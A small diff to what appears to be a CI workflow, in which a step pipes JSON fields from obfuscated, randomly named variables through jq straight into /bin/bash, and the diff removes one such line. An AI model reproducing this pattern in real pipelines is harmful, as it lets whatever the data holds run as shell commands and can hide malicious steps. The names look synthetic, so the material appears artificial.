@@ -22,7 +22,6 @@ jobs:
           printf '%s' "$vludw24416" | jq -r .dmocf5 | /bin/bash
           echo $eb97 | jq -r .gqvxb48406 | /bin/bash
           printf '%s' "$lrago30" | jq -r .qz4 | /bin/bash
-          echo $xqbqd7 | jq -r .wmfhk6955 | /bin/bash
           echo $infv06 | jq -r .sa1 | /bin/bash
 
       - name: Store output
